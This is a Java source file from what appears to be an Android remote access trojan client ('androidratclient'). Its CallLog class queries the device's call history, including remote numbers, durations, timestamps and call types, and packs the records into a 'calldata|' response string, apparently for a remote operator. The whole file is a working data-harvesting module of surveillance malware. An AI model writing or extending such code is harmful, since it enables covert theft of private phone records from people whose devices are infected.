package com.dev.ah10.androidratclient;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.util.Log;

import java.util.Date;

class CallLog
{
    private Context ctx; //The context for the class to use

    CallLog(Context appContext) //Constructor
    {
        ctx = appContext; //Set the application context
    }

    String getCallLog() //Get the call log
    {
        try
        {
            StringBuilder log = new StringBuilder();
            ContentResolver cr = ctx.getContentResolver(); //Get the content resolver
            Cursor cur = cr.query( //Create new query
                    android.provider.CallLog.Calls.CONTENT_URI, //Calls table
                    null,
                    null,
                    null,
                    android.provider.CallLog.Calls.DATE + " DESC" //Order date by descending
            );

            if (cur != null && cur.getCount() > 0) //If can query and data available
            {
                log.append("calldata|"); //Response command
                while (cur.moveToNext()) //Move to next row
                {
                    //Get call data
                    String remoteNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                    String callDuration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));
                    String callDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE));
                    Date callTime = new Date(Long.valueOf(callDate));
                    String callType = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE));
                    String fCallType;
                    Integer iCallType = Integer.parseInt(callType);

                    //Format the call type
                    switch (iCallType)
                    {
                        case android.provider.CallLog.Calls.INCOMING_TYPE:
                            fCallType = "Incoming";
                            break;

                        case android.provider.CallLog.Calls.OUTGOING_TYPE:
                            fCallType = "Outgoing";
                            break;

                        case android.provider.CallLog.Calls.MISSED_TYPE:
                            fCallType = "Missed";
                            break;

                        default:
                            fCallType = "Unknown";
                    }

                    //Append call data to data string
                    log.append(remoteNumber).append(";")
                        .append(callDuration).append(";")
                        .append(callTime).append(";")
                        .append(fCallType).append("|");
                }

                cur.close(); //Close the query
                String result = log.toString(); //Get the result
                result = result.replace("+", "plus"); //Replace + sign with text (because some Base64 conflicts)
                return result.substring(0, result.length() - 1); //Cut the last separator char
            }
            else //No data
            {
                return "calldata|failed";
            }
        }
        catch (SecurityException ex) //Permission Prompt cancelled at the start of the application
        {
            Log.e("CallLog", "Error retrieving call log: " + ex.toString());
            return "calldata|failed";
        }
    }
}
